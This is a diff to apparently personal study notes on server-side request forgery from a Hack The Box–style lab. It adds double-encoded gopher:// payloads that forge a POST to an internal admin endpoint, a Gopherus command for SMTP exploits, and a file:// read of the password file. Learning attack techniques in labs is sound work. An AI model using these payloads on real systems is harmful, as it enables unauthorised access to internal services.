@@ -49,7 +49,46 @@ for example try `file:///ertc/passwd`
 ### The gopher Protocol
 Using http:// URL scheme we cannot send POST request, assume there is an endpoint where we have to send password as a parameter, so we use gopher URL scheme to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves.
 
+We need to send a POST request which should be double encoded:
+```http
+POST /admin.php HTTP/1.1
+Host: dateserver.htb
+Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
 
+adminpw=admin
+```
+single encoded:
+```
+gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+```
+
+the request with double encoding:
+```http
+POST /index.php HTTP/1.1
+Host: 172.17.0.2
+Content-Length: 265
+Content-Type: application/x-www-form-urlencoded
+
+dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
+```
+
+we can also use gopher for other protocols, but its tedious hence we use [Gopherus](https://github.com/tarunkant/Gopherus) to generate gopher URLs for us.
+The following are supported:
+- MySQL
+- PostgreSQL
+- FastCGI
+- Redis
+- SMTP
+- Zabbix
+- pymemcache
+- rbmemcache
+- phpmemcache
+- dmpmemcache
+need to have python 2
+command:
+	`python2.7 gopherus.py --exploit smtp`
+	
 ## Blind SSRF
 ## Preventing SSRF
 # SSTI
